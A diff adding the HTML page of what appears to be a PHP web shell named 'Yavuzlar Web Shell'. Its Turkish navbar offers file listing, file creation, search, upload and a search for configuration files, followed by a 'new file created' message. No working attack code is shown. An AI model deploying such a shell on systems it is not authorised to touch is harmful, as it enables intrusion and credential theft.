@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Yavuzlar Shell</title>
+</head>
+
+<body>
+
+    <center>
+        <img src="navbar-logo.png" class="logo">
+        <div class="title">Yavuzlar Web Shell</div>
+
+        <table class="navbar">
+            <tbody>
+                <tr>
+                    <td>
+                        <a href="index.php?action=list-files">Dosyalar</a>
+                        <a href="index.php?action=file-operations">Dosya Ekle</a>
+                        <a href="index.php?action=search-files">Dosya Arama</a>
+                        <a href="index.php?action=file-upload">Dosya Yükle</a>
+                        <a href="index.php?action=find-config-files">Konfigürasyon Ara</a>
+                    </td>
+                </tr>
+                            </tbody>
+        </table>
+
+        Yeni dosya oluşturuldu.
